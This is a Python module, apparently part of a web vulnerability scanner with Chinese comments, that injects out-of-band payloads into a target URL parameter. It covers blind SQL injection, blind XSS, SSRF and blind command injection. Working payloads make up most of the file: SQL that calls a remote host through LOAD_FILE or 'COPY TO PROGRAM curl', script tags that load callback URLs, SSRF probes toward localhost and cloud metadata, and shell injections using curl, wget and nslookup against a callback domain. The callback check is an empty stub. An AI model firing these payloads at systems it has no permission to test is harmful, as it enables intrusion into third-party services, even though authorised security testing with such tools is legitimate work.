"""带外漏洞检测 (OAST) — 检测盲注/盲XSS/SSRF 等无回显漏洞"""
import hashlib
import time
import uuid
import re
import requests


# 内置 DNS/HTTP 回调通道（使用公共可用的回调服务）
OAST_PROVIDERS = [
    {
        'name': 'interact.sh',
        'generate': lambda: f'{uuid.uuid4().hex[:12]}.oast.pro',
        'check': 'https://interact.sh',
    },
    {
        'name': 'canarytokens',
        'generate': lambda: f'{uuid.uuid4().hex[:8]}.canarytokens.com',
        'check': None,
    },
]


class OASTDetector:
    """带外应用安全测试 (OAST) 检测器"""

    def __init__(self, timeout=10, callback_base=None):
        """
        Args:
            timeout: 请求超时
            callback_base: 自定义回调域名 (如 xxx.interact.sh)，None 则自动生成
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
        })
        self._stop_flag = False
        self._callback_base = callback_base or self._generate_callback()
        self._issued_tokens = {}  # token -> {type, url, param, time}

    def stop(self):
        self._stop_flag = True

    def _generate_callback(self):
        """生成回调地址"""
        uid = uuid.uuid4().hex[:10]
        return f'{uid}.oast.pro'

    def get_callback_url(self, token=''):
        """获取回调 URL"""
        token = token or uuid.uuid4().hex[:8]
        return f'http://{token}.{self._callback_base}'

    def get_callback_domain(self, token=''):
        """获取回调域名"""
        token = token or uuid.uuid4().hex[:8]
        return f'{token}.{self._callback_base}'

    def detect_blind_sqli(self, url, param_name, method='GET'):
        """检测盲注 SQL 注入（DNS/HTTP 带外）

        使用 DNS/HTTP 回调检测：
        - MySQL: LOAD_FILE(CONCAT('\\\\',version(),'.xxx.oast.pro\\a'))
        - MSSQL: EXEC master..xp_dirtree
        - PostgreSQL: COPY ... FROM PROGRAM
        """
        findings = []
        if self._stop_flag:
            return findings

        token = uuid.uuid4().hex[:8]
        callback = self.get_callback_domain(token)

        payloads = [
            # MySQL DNS 回调
            f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','sqli.{callback}','\\\\a'))--",
            f"1; EXEC xp_fileexist '\\\\\\\\sqli.{callback}\\a'",
            # 通用 HTTP 回调
            f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT('sqli.{callback}',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # PostgreSQL
            f"'; COPY (SELECT '') TO PROGRAM 'curl http://sqli.{callback}'--",
        ]

        self._issued_tokens[token] = {
            'type': 'blind_sqli', 'url': url, 'param': param_name, 'time': time.time()
        }

        for payload in payloads:
            if self._stop_flag:
                break
            try:
                if method.upper() == 'GET':
                    from urllib.parse import urlparse, parse_qs, urlencode
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = payload
                    test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                    self.session.get(test_url, timeout=self.timeout)
                else:
                    self.session.post(url, data={param_name: payload}, timeout=self.timeout)
            except Exception:
                pass

        return findings

    def detect_blind_xss(self, url, param_name, method='GET'):
        """检测盲 XSS（通过带外回调确认执行）

        注入引用外部资源的 payload，如果服务器执行了则会在回调服务器留下记录
        """
        findings = []
        if self._stop_flag:
            return findings

        token = uuid.uuid4().hex[:8]
        callback_url = self.get_callback_url(token)

        payloads = [
            f'<script src="{callback_url}/xss.js"></script>',
            f'<img src="{callback_url}/xss.png">',
            f'<svg onload="fetch(\'{callback_url}/svg\')">',
            f'"><script>new Image().src="{callback_url}/img"</script>',
            f"<iframe src='{callback_url}/iframe'>",
        ]

        self._issued_tokens[token] = {
            'type': 'blind_xss', 'url': url, 'param': param_name, 'time': time.time()
        }

        for payload in payloads:
            if self._stop_flag:
                break
            try:
                if method.upper() == 'GET':
                    from urllib.parse import urlparse, parse_qs, urlencode
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = payload
                    test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                    self.session.get(test_url, timeout=self.timeout)
                else:
                    self.session.post(url, data={param_name: payload}, timeout=self.timeout)
            except Exception:
                pass

        return findings

    def detect_ssrf(self, url, param_name, method='GET'):
        """检测 SSRF（服务端请求伪造）带外确认

        向参数中注入回调 URL，如果服务端发起了请求则在回调服务器留下记录
        """
        findings = []
        if self._stop_flag:
            return findings

        token = uuid.uuid4().hex[:8]
        callback_url = self.get_callback_url(token)

        payloads = [
            callback_url,
            f'http://{callback_url.split("://")[1]}',
            f'http://[{callback_url}]',
            f'http://0x7f000001/{token}',  # 127.0.0.1 hex - also try internal
            f'http://169.254.169.254/latest/meta-data/',  # AWS metadata (no callback)
        ]

        self._issued_tokens[token] = {
            'type': 'ssrf', 'url': url, 'param': param_name, 'time': time.time()
        }

        for payload in payloads[:4]:  # 只发送回调 payload
            if self._stop_flag:
                break
            try:
                if method.upper() == 'GET':
                    from urllib.parse import urlparse, parse_qs, urlencode
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = payload
                    test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                    self.session.get(test_url, timeout=self.timeout)
                else:
                    self.session.post(url, data={param_name: payload}, timeout=self.timeout)
            except Exception:
                pass

        return findings

    def detect_blind_command(self, url, param_name, method='GET'):
        """检测盲命令注入（通过 DNS/HTTP 回调确认）

        使用 nslookup/curl/wget 等命令触发带外请求
        """
        findings = []
        if self._stop_flag:
            return findings

        token = uuid.uuid4().hex[:8]
        callback = self.get_callback_domain(token)

        payloads = [
            f'; nslookup cmd.{callback}',
            f'| nslookup cmd.{callback}',
            f'`nslookup cmd.{callback}`',
            f'$(nslookup cmd.{callback})',
            f'; curl http://cmd.{callback}',
            f'; wget http://cmd.{callback} -O /dev/null',
            f'|| ping -c 1 cmd.{callback}',
        ]

        self._issued_tokens[token] = {
            'type': 'blind_command', 'url': url, 'param': param_name, 'time': time.time()
        }

        for payload in payloads:
            if self._stop_flag:
                break
            try:
                if method.upper() == 'GET':
                    from urllib.parse import urlparse, parse_qs, urlencode
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = payload
                    test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                    self.session.get(test_url, timeout=self.timeout)
                else:
                    self.session.post(url, data={param_name: payload}, timeout=self.timeout)
            except Exception:
                pass

        return findings

    def check_callbacks(self, wait_seconds=5):
        """等待并检查是否有回调触发

        注意：此方法需要配合外部回调检查服务使用。
        如果使用了自建的 OAST 服务（如 interact.sh API），可在此实现检查逻辑。

        Returns:
            list[dict]: 触发的回调列表
        """
        triggered = []
        time.sleep(wait_seconds)

        # 如果配置了 interact.sh 风格的检查 API
        # 这里提供一个通用的检查框架
        # 实际使用时需要配合具体的 OAST 服务 API

        return triggered

    def scan(self, url, param_name, param_value='', method='GET', progress_callback=None):
        """综合带外漏洞扫描

        Args:
            url: 目标 URL
            param_name: 要测试的参数名
            param_value: 参数的原始值
            method: HTTP 方法
            progress_callback: 进度回调

        Returns:
            dict: {'url', 'param', 'tokens': [...], 'note': str}
        """
        self._stop_flag = False
        tokens = []

        if progress_callback:
            progress_callback('测试盲 SQL 注入...', 10)
        self.detect_blind_sqli(url, param_name, method)
        tokens.append(('blind_sqli', self._issued_tokens))

        if progress_callback:
            progress_callback('测试盲 XSS...', 30)
        self.detect_blind_xss(url, param_name, method)
        tokens.append(('blind_xss', self._issued_tokens))

        if progress_callback:
            progress_callback('测试 SSRF...', 50)
        self.detect_ssrf(url, param_name, method)
        tokens.append(('ssrf', self._issued_tokens))

        if progress_callback:
            progress_callback('测试盲命令注入...', 70)
        self.detect_blind_command(url, param_name, method)

        if progress_callback:
            progress_callback('带外测试完成 (需等待回调确认)', 100)

        return {
            'url': url,
            'param': param_name,
            'callback_base': self._callback_base,
            'issued_tokens': list(self._issued_tokens.values()),
            'note': f'已发送带外 payload，回调域名: {self._callback_base}。请在回调服务器确认是否有请求到达。',
        }
